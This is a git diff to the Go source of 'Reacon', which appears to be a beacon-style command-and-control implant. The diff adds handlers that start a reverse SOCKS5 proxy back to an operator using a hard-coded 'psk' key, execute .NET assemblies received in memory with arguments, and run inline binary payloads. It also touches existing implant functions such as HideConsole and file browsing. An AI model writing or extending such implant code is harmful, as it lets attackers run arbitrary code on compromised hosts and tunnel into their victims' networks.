@@ -4,13 +4,13 @@ import (
 	"Reacon/pkg/commands"
 	"Reacon/pkg/communication"
 	"Reacon/pkg/config"
+	Proxy "Reacon/pkg/services/proxy"
 	"Reacon/pkg/sysinfo"
 	"Reacon/pkg/utils"
 	"bytes"
 	"crypto/rand"
 	"errors"
 	"fmt"
-	"github.com/shirou/gopsutil/process"
 	"io"
 	"io/ioutil"
 	"math/big"
@@ -19,6 +19,8 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/shirou/gopsutil/process"
 )
 
 func HideConsole() error {
@@ -168,23 +170,6 @@ func CmdFileBrowse(dirPathBytes []byte) ([]byte, error) {
 	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
 	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")
 
-	// build string for result
-	/*
-	   /Users/xxxx/Desktop/dev/deacon/*
-	   D       0       25/07/2020 09:50:23     .
-	   D       0       25/07/2020 09:50:23     ..
-	   D       0       09/06/2020 00:55:03     cmd
-	   D       0       20/06/2020 09:00:52     obj
-	   D       0       18/06/2020 09:51:04     Util
-	   D       0       09/06/2020 00:54:59     bin
-	   D       0       18/06/2020 05:15:12     config
-	   D       0       18/06/2020 13:48:07     crypt
-	   D       0       18/06/2020 06:11:19     Sysinfo
-	   D       0       18/06/2020 04:30:15     .vscode
-	   D       0       19/06/2020 06:31:58     packet
-	   F       272     20/06/2020 08:52:42     deacon.csproj
-	   F       6106    26/07/2020 04:08:54     Program.cs
-	*/
 	fileInfo, err := os.Stat(dirPathStr)
 	if err != nil {
 		return nil, err
@@ -442,4 +427,35 @@ func GetFileContent(cmdBuf []byte) ([]byte, error) {
 
 	return []byte("reading file" + filePath), nil
 
+}
+func SocksConnect(cmdBuf []byte) ([]byte, error) {
+	go Proxy.ReverseSocksAgent(string(cmdBuf), "psk", false)
+	return []byte("[*] Start socks5 proxy"), nil
+}
+func SocksClose() ([]byte, error) {
+	Proxy.Session.Close()
+	return []byte("[*] Stop socks5 proxy"), nil
+}
+
+// len(file) || file || args
+func Execute_Assembly(b []byte) ([]byte, error) {
+	buf := bytes.NewBuffer(b)
+	fileLenBytes := make([]byte, 4)
+	buf.Read(fileLenBytes)
+	fileLen := utils.ReadInt(fileLenBytes)
+	fileContent := make([]byte, fileLen)
+	buf.Read(fileContent)
+	args := buf.String()
+	if args == "<nil>" {
+		args = ""
+	}
+
+	result, err := commands.ExecuteAssembly(fileContent, args)
+	return result, err
+
+}
+
+func Inline_bin(b []byte) ([]byte, error) {
+	commands.Inline_Bin(b)
+	return nil, nil
 }
